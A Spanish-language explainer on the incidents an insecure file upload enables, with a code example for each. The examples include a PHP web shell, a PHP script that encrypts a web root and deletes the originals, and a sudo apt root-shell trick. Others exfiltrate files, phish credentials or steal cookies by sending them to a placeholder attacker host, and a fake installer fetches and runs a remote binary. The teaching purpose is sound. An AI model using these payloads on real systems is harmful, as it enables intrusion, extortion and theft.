Tipos de incidentes posibles tras una carga insegura

Una subida de archivos insegura puede desencadenar varios incidentes graves. A continuación se muestran los más importantes, con una explicación breve, el mecanismo de ataque y un ejemplo de código.

RCE Ejecución remota de código

Qué es: ocurre cuando un atacante logra que el servidor ejecute código malicioso que él introdujo en el sistema.

Cómo ocurre: el archivo subido se guarda y luego el servidor lo interpreta como código PHP, ASP, JSP o similar.

<?php
// Verifica si el parámetro cmd está presente en la URL
if (isset($_GET['cmd'])) {
    // Ejecuta el comando recibido en el servidor
    echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';
}
// Con este código, cualquier atacante puede ejecutar comandos remotos
?>

Impacto: toma de control del servidor, lectura de datos, instalación de malware y persistencia del atacante.

Path Traversal Navegación de directorios

Qué es: permite saltar fuera de la carpeta permitida para leer archivos sensibles del sistema.

Cómo ocurre: la aplicación concatena la entrada del usuario con una ruta base sin validarla.

// Obtiene el nombre del archivo desde la petición del usuario
String fileName = request.getParameter("file");
// Construye la ruta destino sin limpiar el valor de fileName
File file = new File("/uploads/" + fileName);
// Si el usuario envía ../ puede salir de /uploads/ y acceder a rutas superiores
out.println("Archivo cargado");
// Muestra un mensaje de éxito aunque la ruta sea peligrosa

Ejemplo: el atacante envía ../../../../etc/passwd y logra leer archivos del sistema.

Ransomware Cifrado y extorsión

Qué es: un malware que cifra archivos y exige un rescate para recuperar la información.

Cómo ocurre: el atacante sube un archivo ejecutable o un script que se activa en el servidor.

<?php
// Clave que usa el atacante para cifrar los archivos
$key = "clave_del_atacante";
// Recorre todos los archivos dentro de la web
$files = new RecursiveIteratorIterator(
    new RecursiveDirectoryIterator('/var/www/html')
);
foreach ($files as $file) {
    // Solo cifra archivos regulares, no los scripts PHP del propio atacante
    if ($file->isFile() && $file->getExtension() != 'php') {
        // Lee el contenido del archivo
        $content = file_get_contents($file->getPathname());
        // Cifra los datos con AES-256-CBC
        $encrypted = openssl_encrypt($content, 'AES-256-CBC', $key);
        // Guarda el archivo cifrado con extensión .encrypted
        file_put_contents($file->getPathname() . '.encrypted', $encrypted);
        // Elimina el archivo original para forzar el rescate
        unlink($file->getPathname());
    }
}
?>

Impacto: pérdida de datos, interrupción del negocio y posibles sanciones legales.

Robo de datos Exfiltración de información

Qué es: el atacante extrae credenciales, bases de datos o archivos confidenciales desde el servidor.

Cómo ocurre: mediante Path Traversal, web shells o scripts que envían los archivos al atacante.

<?php
// Comprueba si el formulario de exfiltración fue enviado
if (isset($_POST['exfiltrate'])) {
    // Lee el contenido del archivo solicitado por el atacante
    $data = file_get_contents($_POST['file']);
    // Prepara la conexión hacia el servidor del atacante
    $ch = curl_init('https://servidor-atacante.com/collect');
    curl_setopt($ch, CURLOPT_POST, true);
    // Envía el contenido codificado en base64
    curl_setopt($ch, CURLOPT_POSTFIELDS, ['data' => base64_encode($data)]);
    // Ejecuta la petición y envía los datos robados
    curl_exec($ch);
}
?>

Impacto: filtración de usuarios, datos financieros, secretos empresariales o información médica.

Escalada de privilegios Obtención de control total

Qué es: el atacante empieza con acceso limitado y termina obteniendo permisos de administrador o root.

Cómo ocurre: aprovecha errores de configuración, SUID, sudo mal configurado o servicios con permisos excesivos.

$ sudo -l
# Muestra los comandos que el usuario puede ejecutar con sudo
(ALL) NOPASSWD: /usr/bin/apt
# Si el usuario tiene apt sin contraseña, puede ejecutar comandos arbitrarios via apt
$ sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
# Esto aprovecha una opción de apt para ejecutar /bin/sh como root

Impacto: control total del servidor, capacidad de modificar cualquier recurso y persistir indefinidamente.

DoS Denegación de servicio

Qué es: el atacante consume recursos hasta dejar el servicio fuera de línea.

Cómo ocurre: se suben cientos de archivos, archivos enormes o archivos que causan procesamiento excesivo.

# Envia 1000 solicitudes de subida en segundo plano
for i in {1..1000}; do
    curl -F "file=@/dev/zero" http://victima.com/upload &
    # El símbolo & envía cada petición al fondo para saturar el servidor
done

Impacto: saturación de disco, memoria y CPU; el sistema deja de responder a usuarios legítimos.

Phishing Engaño para robar credenciales

Qué es: el atacante crea una página falsa que parece legítima para capturar nombres de usuario y contraseñas.

Cómo ocurre: el atacante sube un archivo HTML que simula la interfaz real del sistema.

<form id="loginForm">
  <input id="username">
  <input id="password" type="password">
  <button type="submit">Ingresar</button>
</form>
<script>
// Cuando el usuario envía el formulario, el script intercepta la acción
document.getElementById('loginForm').addEventListener('submit', function(e) {
  e.preventDefault();
  // Envía las credenciales a un servidor controlado por el atacante
  fetch('https://servidor-atacante.com/steal', { method: 'POST', body: JSON.stringify({username: document.getElementById('username').value, password: document.getElementById('password').value}) });
});
</script>

Impacto: robo de credenciales, suplantación de identidad y fraude financiero.

Stored XSS Ejecución de código en navegadores

Qué es: un atacante inyecta JavaScript malicioso que luego se ejecuta cuando otros usuarios visitan la página.

Cómo ocurre: el archivo subido contiene HTML o JavaScript y el servidor lo sirve al navegador de otros usuarios.

<!DOCTYPE html>
<html>
<body>
  <script>
    // El script roba la cookie del usuario y la envía al atacante
    fetch('https://servidor-atacante.com/steal?cookie=' + document.cookie);
  </script>
</body>
</html>

Impacto: robo de cookies, secuestro de sesiones y redirección a sitios fraudulentos.

Defacement Modificación del sitio

Qué es: el atacante reemplaza el contenido legítimo del sitio con mensajes ofensivos o falsos.

Cómo ocurre: consigue permisos para modificar archivos del servidor o sustituye el contenido principal por una versión maliciosa.

<!DOCTYPE html>
<html>
<body>
  <h1>Hackeado por X</h1>
  <!-- El atacante cambia el contenido visible de la página -->
</body>
</html>

Impacto: daño a la reputación, pérdida de confianza y necesidad de restauración del sitio.

Cadena de suministro Distribución de malware

Qué es: el atacante compromete un archivo que luego se distribuye como si fuera legítimo.

Cómo ocurre: se sube un falso instalador o herramienta de estudio que, al descargarse, infecta los equipos de los usuarios.

<?php
// Instalador falso que descarga el malware desde el atacante
shell_exec('curl -O https://servidor-atacante.com/cliente-malicioso');
// Da permiso de ejecución y ejecuta el archivo malicioso
shell_exec('chmod +x cliente-malicioso && ./cliente-malicioso');
?>

Impacto: infección masiva de usuarios, propagación del daño y pérdida de confianza en los recursos compartidos.

Contenido malicioso Inyección de material dañino

Qué es: el atacante inserta contenido no deseado que luego se muestra a los usuarios.

Cómo ocurre: un archivo HTML o una imagen con código malicioso se sirve desde el servidor.

<img src="x" onerror="fetch('https://atacante.com/steal?c=' + document.cookie)" />
// La imagen falla al cargar y ejecuta JavaScript para enviar la cookie al atacante

Impacto: ejecución de scripts en el navegador, robo de información y engaño a los usuarios.
